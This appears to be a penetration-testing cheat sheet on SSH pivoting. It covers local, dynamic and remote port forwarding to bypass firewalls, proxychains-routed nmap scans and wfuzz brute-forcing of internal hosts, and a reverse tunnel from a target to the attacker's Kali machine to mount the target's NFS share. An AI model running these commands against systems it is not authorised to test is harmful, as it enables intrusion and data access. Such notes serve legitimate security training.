### Local SSH Port Forwarding to Bypass Firewalls

The SSH server redirects data from a specified port (which is local to the host running the SSH client e.g. Kali/attacker) through a secure tunnel to a specified destination host and port. This sometimes allows bypass of firewall rules.

Have shell access -> enum'd a new port/service via. `netstat` but can't access it from within the target / blocked?
```
$ ssh -L [local_port]:[target/jumpbox]:[blocked_port] [user]@[target]

# example - bypass blocked HTTP service on port 80
$ ssh -L 80:192.168.218.99:80 bob@192.168.218.99
```

### Dynamic Port Forwarding

This will allow you to access internal network services on dynamic (as opposed to static) ports.

Proxychains
1. Ensure `/etc/proxychains4.conf` is setup with the preferred port (deafult is `9050`).
2. Establish SSH tunnel with proxy server `$ kali> sudo ssh -N -D 127.0.0.1:9050 username@proxy_server/jump_box`
3. Run commands `$ proxychains curl http://[internal_target]`

Sshuttle
```
$ sshuttle user@[proxy_server] [internal_cidr]
$ sshuttle hello@10.11.1.251 10.1.1.0/24
```

Directory brute-force example
* Wfuzz works well, Gobuster requires some setup.
```
$ wfuzz -p 127.0.0.1:9050:SOCKS4 -c -w [/path/to/wordlist] --hc=404 http://[internal_target]/FUZ
```

Proxychains examples
```
$ proxychains nmap -Pn -sT -sV [target]       # nmap internal scan
$ proxychains curl http://localhost/exec.php  # request internal web server
```

### Remote Port Forwarding

SSH remote port forwarding is for opening a connection from within the target -> Kali.
* Can bypass inbound firewall restrictions to SSH (as outbound connection is used).
* Can be used to access a target's localhost services from Kali (see NFS below)
```
# Mount a target's localhost NFS share
$ target> ssh -N -R [kali]:2049:127.0.0.1:2049 kali@[kali_ip]
$ kali> mount -t nfs 127.0.0.1:/ /mnt -o nolock
```
